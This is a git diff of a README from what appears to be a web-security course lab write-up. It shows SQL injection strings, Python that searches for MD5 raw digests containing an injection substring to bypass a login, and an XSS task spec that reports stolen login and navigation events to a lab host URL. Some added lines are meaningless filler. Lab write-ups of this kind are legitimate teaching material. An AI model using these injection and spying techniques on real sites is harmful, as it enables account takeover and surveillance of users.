@@ -555,7 +555,7 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 > **I had no clue how long it would take to iterate hashes until the raw binary contained a valid injection substring - but I did know that the shorter I could make it, the better, so:**     
 >
 > **Starting with: `'OR "1"="1"'` then a few (many) rounds of blind elimination -**    
-> **I determined that '=' was the smallest inject in sql_0 that I could sign in as victim.**     
+> **I determined that '=' was the smallest inject in sql_0 that I could use to sign in as victim.**     
 >> ```python
 >>        if inject.encode() in d: # 'encode' the str `inject` for comparison of bytes in `d` digest.
 >>            print(f'inject: [ {str_in} ] | from: [ {d} ] | time: [ {time.time() - start_time} ]')
@@ -571,8 +571,8 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 >> ```
 >     
 > **I decided to implement user input ASCII injection strings (from CLI with `sys`) for encoding.**    
-> **The first string I tried was 'or 1=1# but, I killed the process after a couple of minutes.**    
-> **The second string I tried was '='# but, I similarly killed the process.**    
+> **The first string I tried was `'or 1=1#` but, I killed the process after a couple of minutes.**    
+> **The second string I tried was `'='#` but, I similarly killed the process.**    
 > **While hardly scientific, this proved to be a practical example of "Avalanching"**    
 
 ### [xss_payload.html](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/xss_payload.html)
@@ -584,8 +584,11 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 >>> **\- "Hide evidence of attack in the *Bungle!* search history view as long as your code is running."**    
 >>
 >> ***Persistence*:**     
->>> **\- "Continue the attack if the user navigates to another *Bungle!* page by link, form submission, and logging in or out."**    
->>> **\- "Continue the attack if the user navigates to another *Bungle!* page by using the browser's back or forward buttons."**    
+>>> **\- "Continue the attack if the user navigates to another *Bungle!* page by:**     
+>>>> **link, form submission, and logging in or out."**    
+>>>
+>>> **\- "Continue the attack if the user navigates to another *Bungle!* page by:**
+>>>> **using the browser's back or forward buttons."**    
 >>
 >> ***Spying*:**     
 >>> **\- "Report all login and logout events by loading the URLs:"**    
@@ -594,46 +597,24 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 >>>
 >>> **\- "Report each page that is displayed (what the user thinks they are seeing) by loading the url:"**    
 >>>> \- `http://192.168.1.1:31337/stolen?event=nav&user=<username>&url=<encoded_url>`     
->> ```python
->> def hasher(inject):
->>     start_time = time.time()
->>     str_in = 0
->>     while True:
->>         str_in += 1 # increment str_in by 1, each loop
->>         
->>         m = hashlib.md5() # instantiate the md5 function as `m`
+>> ```html
+>> // filler
+>>
 >> ```
 >
-> **From: [/manual/function.md5.php](https://www.php.net/manual/en/function.md5.php) I learned that `md5( ,true);` returns "the md5 digest in raw binary format."**    
-> **Raw binary can contain any byte value, meaning that a particular hash may contain a certain, desired substring.**
->> ```python
->>        m.update(str(str_in).encode())
+> **F."**    
+> **R.**
+>> ```html
+>> // filler
 >>        
->>        d = m.digest() # `digest()` returns the bytes object "digest" from `update()` containing binary encoded hexadecimal characters.
 >> ```
-> **I had no clue how long it would take to iterate hashes until the raw binary contained a valid injection substring -**     
-> **but I did know that the shorter I could make it, the better - so:**     
+> **I.**     
+> **b:**     
 >
-> **Starting with: `'OR "1"="1"'` then a few (many) rounds of blind elimination -**    
-> **I determined that '=' was the smallest inject in sql_0 that I could sign in as victim.**     
->> ```python
->>        if inject.encode() in d: # 'encode' the str `inject` for comparison of bytes in `d` digest.
->>            print(f'inject: [ {str_in} ] | from: [ {d} ] | time: [ {time.time() - start_time} ]')
->>            break
->> ```
-> **I was pleasantly surprised by the results:**    
-> **"inject: [ 1839431 ] | from: [ b"\xc37\x90\xa5\xaf\xc4\xb1A@J\xbe'='\xaa\xa9" ] | time: [ 1.2804677486419678 ]"**    
->> ```python
->> if __name__ == '__main__':
->>    # slice `hasher.py` from sys.argv and join on space, store in inject
->>    inject = ' '.join(sys.argv[1:])    
->>    hasher(inject)
->> ```
->     
-> **I decided to implement user input ASCII injection strings (from CLI with `sys`) for encoding.**    
-> **The first string I tried was 'or 1=1# but, I killed the process after a couple of minutes.**    
-> **The second string I tried was '='# but, I similarly killed the process.**    
-> **While hardly scientific, this proved to be a practical example of "Avalanching"**   
+> **I.**    
+> **T.**    
+> **T.**    
+>
 
 ### [cors_server.py](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/cors_server.py)
 ### [csrf_0.html](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/csrf_0.html)
